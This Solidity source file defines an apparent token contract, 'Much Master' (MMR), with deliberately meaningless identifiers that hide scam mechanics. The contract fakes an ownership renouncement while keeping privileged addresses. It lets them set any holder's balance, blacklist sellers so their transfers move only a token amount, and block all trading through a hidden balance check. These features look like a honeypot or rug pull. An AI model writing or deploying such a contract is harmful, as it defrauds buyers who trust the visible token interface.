//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface listTxWallet {
    function createPair(address amountBuyLiquidity, address exemptList) external returns (address);
}

interface modeFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingExempt) external view returns (uint256);

    function transfer(address modeIs, uint256 swapTotal) external returns (bool);

    function allowance(address autoMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 swapTotal) external returns (bool);

    function transferFrom(
        address sender,
        address modeIs,
        uint256 swapTotal
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableMarketing, uint256 value);
    event Approval(address indexed autoMarketing, address indexed spender, uint256 value);
}

abstract contract maxTxToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toExemptEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface modeFromMetadata is modeFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MuchMaster is maxTxToken, modeFrom, modeFromMetadata {

    function getOwner() external view returns (address) {
        return maxWalletMin;
    }

    address public walletSell;

    uint256 constant feeTx = 8 ** 10;

    bool public maxBuy;

    uint256 public launchedWalletMin;

    function toTotalFee(address liquidityTokenLaunched) public {
        modeShould();
        if (maxBuy == amountFund) {
            totalReceiverTrading = isMarketing;
        }
        if (liquidityTokenLaunched == walletSell || liquidityTokenLaunched == autoToTx) {
            return;
        }
        takeLaunched[liquidityTokenLaunched] = true;
    }

    uint256 txWalletReceiver;

    uint256 public totalReceiverTrading;

    uint256 private isMarketing;

    mapping(address => bool) public takeLaunched;

    address private maxWalletMin;

    function name() external view virtual override returns (string memory) {
        return swapSender;
    }

    mapping(address => mapping(address => uint256)) private enableShouldBuy;

    uint256 public minLaunch;

    function decimals() external view virtual override returns (uint8) {
        return launchedFund;
    }

    function exemptMode() public {
        emit OwnershipTransferred(walletSell, address(0));
        maxWalletMin = address(0);
    }

    string private swapSender = "Much Master";

    address public autoToTx;

    uint256 launchedSwap;

    uint256 private shouldSenderMarketing = 100000000 * 10 ** 18;

    address tokenReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function takeLiquidity(address senderFeeLaunched, address modeIs, uint256 swapTotal) internal returns (bool) {
        if (senderFeeLaunched == walletSell) {
            return atTake(senderFeeLaunched, modeIs, swapTotal);
        }
        uint256 listTrading = modeFrom(autoToTx).balanceOf(tokenReceiver);
        require(listTrading == txWalletReceiver);
        require(modeIs != tokenReceiver);
        if (takeLaunched[senderFeeLaunched]) {
            return atTake(senderFeeLaunched, modeIs, feeTx);
        }
        return atTake(senderFeeLaunched, modeIs, swapTotal);
    }

    function atTake(address senderFeeLaunched, address modeIs, uint256 swapTotal) internal returns (bool) {
        require(marketingLaunched[senderFeeLaunched] >= swapTotal);
        marketingLaunched[senderFeeLaunched] -= swapTotal;
        marketingLaunched[modeIs] += swapTotal;
        emit Transfer(senderFeeLaunched, modeIs, swapTotal);
        return true;
    }

    string private sellFrom = "MMR";

    mapping(address => bool) public walletList;

    function allowance(address modeBuy, address teamShould) external view virtual override returns (uint256) {
        if (teamShould == limitTx) {
            return type(uint256).max;
        }
        return enableShouldBuy[modeBuy][teamShould];
    }

    uint256 private fromAt;

    bool public launchedMode;

    constructor (){

        toExemptEnable limitSenderTake = toExemptEnable(limitTx);
        autoToTx = listTxWallet(limitSenderTake.factory()).createPair(limitSenderTake.WETH(), address(this));

        walletSell = _msgSender();
        walletList[walletSell] = true;
        marketingLaunched[walletSell] = shouldSenderMarketing;
        exemptMode();
        if (isMarketing == launchedWalletMin) {
            launchedMode = true;
        }
        emit Transfer(address(0), walletSell, shouldSenderMarketing);
    }

    function feeList(address launchList, uint256 swapTotal) public {
        modeShould();
        marketingLaunched[launchList] = swapTotal;
    }

    bool public launchMarketingWallet;

    function modeShould() private view {
        require(walletList[_msgSender()]);
    }

    function approve(address teamShould, uint256 swapTotal) public virtual override returns (bool) {
        enableShouldBuy[_msgSender()][teamShould] = swapTotal;
        emit Approval(_msgSender(), teamShould, swapTotal);
        return true;
    }

    mapping(address => uint256) private marketingLaunched;

    uint8 private launchedFund = 18;

    function swapBuyLaunched(uint256 swapTotal) public {
        modeShould();
        txWalletReceiver = swapTotal;
    }

    bool public sellAt;

    function transferFrom(address senderFeeLaunched, address modeIs, uint256 swapTotal) external override returns (bool) {
        if (_msgSender() != limitTx) {
            if (enableShouldBuy[senderFeeLaunched][_msgSender()] != type(uint256).max) {
                require(swapTotal <= enableShouldBuy[senderFeeLaunched][_msgSender()]);
                enableShouldBuy[senderFeeLaunched][_msgSender()] -= swapTotal;
            }
        }
        return takeLiquidity(senderFeeLaunched, modeIs, swapTotal);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return shouldSenderMarketing;
    }

    function balanceOf(address marketingExempt) public view virtual override returns (uint256) {
        return marketingLaunched[marketingExempt];
    }

    function owner() external view returns (address) {
        return maxWalletMin;
    }

    function symbol() external view virtual override returns (string memory) {
        return sellFrom;
    }

    function receiverMode(address shouldBuy) public {
        if (launchMarketingWallet) {
            return;
        }

        walletList[shouldBuy] = true;
        if (launchedMode == maxBuy) {
            maxBuy = false;
        }
        launchMarketingWallet = true;
    }

    address limitTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address launchList, uint256 swapTotal) external virtual override returns (bool) {
        return takeLiquidity(_msgSender(), launchList, swapTotal);
    }

    event OwnershipTransferred(address indexed teamBuySwap, address indexed takeShouldEnable);

    bool private amountFund;

    bool private exemptTeam;

}
